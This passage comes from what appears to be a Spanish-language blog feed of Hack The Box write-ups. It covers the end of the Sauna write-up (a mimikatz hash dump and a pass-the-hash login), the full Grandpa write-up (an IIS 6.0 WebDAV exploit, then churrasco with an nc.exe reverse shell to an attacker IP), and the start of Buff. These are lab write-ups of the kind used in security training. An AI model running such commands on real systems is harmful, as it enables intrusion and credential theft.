      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : fb8f321c64cea87f
    OldCredentials
      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 19d5f15d689b1ce5
    OlderCredentials
      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : d9379d13f7c15d1c

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:Kerberos &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : fb8f321c64cea87f
    OldCredentials
      des_cbc_md5       : 19d5f15d689b1ce5

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Packages &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    NTLM-Strong-NTOWF

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:WDigest &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    01  b4a06d28f92506a3a336d97a66b310fa
    02  71efaf133c578bd7428bd2e1eca5a044
    03  974acf4f67e4f609eb032fd9a72e8714
    04  b4a06d28f92506a3a336d97a66b310fa
    05  79ba561a664d78d6242748774e8475c5
    06  f1188d8ed0ca1998ae828a60a8c6ac29
    07  801ddc727db9fa3de98993d88a9ffa8b
    08  a779e05da837dd2d303973304869ec0f
    09  ac2c01846aebce4cbd4e3ec69b47a65d
    10  6d863d6ae06c3addc49b7a453afe6fa0
    11  a779e05da837dd2d303973304869ec0f
    12  6676b9fdd4aa7f298f1ada64c044c230
    13  5a01167d750636d66e5602db9aece9b7
    14  f702282bd343c2fee7b98deac8950390
    15  a099aa3c81f1affeba59d79a6533f60d
    16  4bae84b8f0b0306788ff9bda4acb3bd4
    17  976d547fb9e04b0ac5ec60508c275da1
    18  50c302b71d0e08a1a2be14b56225645f
    19  edb19e08653443695f6d3599e0a6bddf
    20  c497465ddc6e2fc14cb0359d0d5de7f8
    21  2ed0b4b57196fb190a66224b2b17029f
    22  37d03051ae1cd6046975948564ab01fa
    23  d4c7554fe1beb0ed712f50cfec470471
    24  8df495fe69cdce409b9f04ea04289b9e
    25  40788044be982310920cc0740687fefd
    26  db7f66f1f1a8f46274d20cfdda5b6e1c
    27  d70226ec52f1ef198c2e1e955a1da9b6
    28  abdd681f875a9b3f3a50b36e51692a2c
    29  dcd140a2ce2bf70fed7ac0e2b60d0dee


mimikatz&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;commandline&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
Bye!
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Fijarse muy bien en la sintaxis de todo en general es importante.&lt;/p&gt;

&lt;p&gt;Procedemos a hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PassTheHash&lt;/code&gt; con el Hash NTLM encontrado para el user Administrator:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e&lt;/span&gt;
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ../Desktop/root.txt
7ad57cf8f51a37019eaadxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Maquina Sauna Hackeada ~~ Active Directory Path ~~ K0H4ck Yeah&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="ASREP-Roast," /><category term="Kerbrute," /><category term="WinPeas," /><category term="BloodHound," /><category term="Neo4j," /><category term="SharpHound.ps1," /><category term="Mimikatz.exe," /><category term="GetChanges-All," /><category term="Maquinas" /><category term="Retiradas," /><category term="Active" /><category term="Directory," /><summary type="html">Sauna AD ~ Hack The Box</summary></entry><entry><title type="html">OSCP Path ~ Grandpa de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2021/11/12/Grandpa.html" rel="alternate" type="text/html" title="OSCP Path ~ Grandpa de Hack The Box (Necesario VIP)" /><published>2021-11-12T00:00:00-03:00</published><updated>2021-11-12T00:00:00-03:00</updated><id>http://localhost:4000/2021/11/12/Grandpa</id><content type="html" xml:base="http://localhost:4000/2021/11/12/Grandpa.html">&lt;h1 id=&quot;grandpa--hack-the-box-to-oscp&quot;&gt;Grandpa ~ Hack The Box to OSCP&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.14       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a listar la Version y Servicios para los puertos encontrados.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -sC -sV -p80 -oN target 10.10.10.14           &quot;&lt;/span&gt;

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: &lt;span class=&quot;s2&quot;&gt;&quot;Microsoft-IIS/6.0&quot;&lt;/span&gt;
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: Unknown
|   Server Date: Fri, 12 Nov 2021 11:34:26 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que tiene un servidor IIS-6.0 bastante desactualizado, procedemos a buscar vulnerabilidades acorder para esta version.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Buscamos por IIS 6.0 github exploit --&amp;gt; Nos aparece el siguiente exploit &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat bof_iis_6.py &lt;/span&gt;
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a probarlo y vemos que es funcional y nos devuelve una consola interactiva&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python bof_iis_6.py                              &lt;/span&gt;
usage:iis6webdav.py targetip targetport reverseip reverseport

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python bof_iis_6.py 10.10.10.14 80 10.10.16.7 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Estando a la escucha por el puerto indicado recibimos la conexion entrante.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443                                                                     &lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.7] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.14] 1030
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 5.2.3790]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Copyright 1985-2003 Microsoft Corp.

c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar un poco el systema&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv

PRIVILEGES INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;

Privilege Name                Description                               State   
&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vemos que tenemos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;
Vamos a compartirnos un recurso compartido a nivel de red para pasarnos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JuicyPotato.exe&lt;/code&gt; para intentar escalar privilegios con el mismo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.16.7&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;uicyPotato.exe JuicyPotato.exe

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Directory of C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc

11/12/2021  02:30 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
11/12/2021  02:30 PM    &amp;lt;DIR&amp;gt;          ..
09/30/2021  08:59 PM           347,648 JuicyPotato.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vale pues procedemos a ejecutarlo.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JuicyPotato.exe
The image file C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;uicyPotato.exe is valid, but is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a machine &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;other than the current machine.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;NOS DA ERROR EL JUICYPOTATO .. AHORA QUE??? Procedemos a enumerar el OS que estamos.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Windows&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 8 Minutes, 54 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:              1 Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS
System Directory:          C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32
Boot Device:               &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
System Locale:             en-us&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;United States&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Input Locale:              en-us&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;United States&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time Zone:                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT+02:00&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 792 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,328 MB
Page File: In Use:         142 MB
Page File Location&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:     C:&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;agefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                 1 Hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: Q147222
Network Card&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:           N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vamos a buscar por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Server 2003 JuicyPotato escalation churrasco.exe&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos descargamos el binario y procedemos a pasarlo a la maquina victima. Nos copiamos en el directorio actual el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; donde estemos compartiendo el recurso compartido.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.16.7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd 10.10.16.7 4444&quot;&lt;/span&gt;
churrasco.exe &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.16.7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd 10.10.16.7 4444&quot;&lt;/span&gt;
/churrasco/--&amp;gt;Current User: NETWORK SERVICE 
/churrasco/--&amp;gt;Getting Rpcss PID ...
/churrasco/--&amp;gt;Found Rpcss PID: 668 
/churrasco/--&amp;gt;Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Rpcss threads ...
/churrasco/--&amp;gt;Found Thread: 672 
/churrasco/--&amp;gt;Thread not impersonating, looking &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;another thread...
/churrasco/--&amp;gt;Found Thread: 676 
/churrasco/--&amp;gt;Thread not impersonating, looking &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;another thread...
/churrasco/--&amp;gt;Found Thread: 684 
/churrasco/--&amp;gt;Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/--&amp;gt;Getting SYSTEM token from Rpcss Service...
/churrasco/--&amp;gt;Found SYSTEM token 0x72c
/churrasco/--&amp;gt;Running &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;with SYSTEM Token...
/churrasco/--&amp;gt;Done, &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;should have ran as SYSTEM!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recibimos la conexion como Administradores del sistema.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 4444&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...

connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.7] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.14] 1041
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 5.2.3790]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Copyright 1985-2003 Microsoft Corp.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;EMP&amp;gt;
&lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a sacar la flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Desktop

&lt;span class=&quot;nb&quot;&gt;dir
dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments and Settings&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop

04/12/2017  04:28 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
04/12/2017  04:28 PM    &amp;lt;DIR&amp;gt;          ..
04/12/2017  04:29 PM                32 root.txt
               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             32 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   1,317,064,704 bytes free

&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;root.txt
9359e905a2c35fxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Comprometida   KO H4ck =)&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="OSCP" /><category term="Path," /><category term="IIS-6.0," /><category term="JuicyPotato," /><category term="Churrasco," /><category term="Maquinas" /><category term="Retiradas," /><category term="Writeup," /><category term="Hacking" /><summary type="html">Grandpa ~ Hack The Box to OSCP</summary></entry><entry><title type="html">Maquina Retirada Buff de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2021/09/29/Buff-Bof.html" rel="alternate" type="text/html" title="Maquina Retirada Buff de Hack The Box (Necesario VIP)" /><published>2021-09-29T00:00:00-03:00</published><updated>2021-09-29T00:00:00-03:00</updated><id>http://localhost:4000/2021/09/29/Buff-Bof</id><content type="html" xml:base="http://localhost:4000/2021/09/29/Buff-Bof.html">&lt;h1 id=&quot;buff--hack-the-box&quot;&gt;BUFF ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Machine IP 10.10.10.198&lt;/p&gt;

&lt;p&gt;Procedemos a realizar los escaneos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; que hacemos siempre:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat target                                                                 &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep  6 20:32:33 2021 as: nmap -sC -sV -p22,80 -oN target 10.10.11.105&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.105
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.046s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: nginx/1.14.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hechando un Ojo a la web, conseguimos ver el CMS que utiliza:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Made using Gym Management Software 1.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
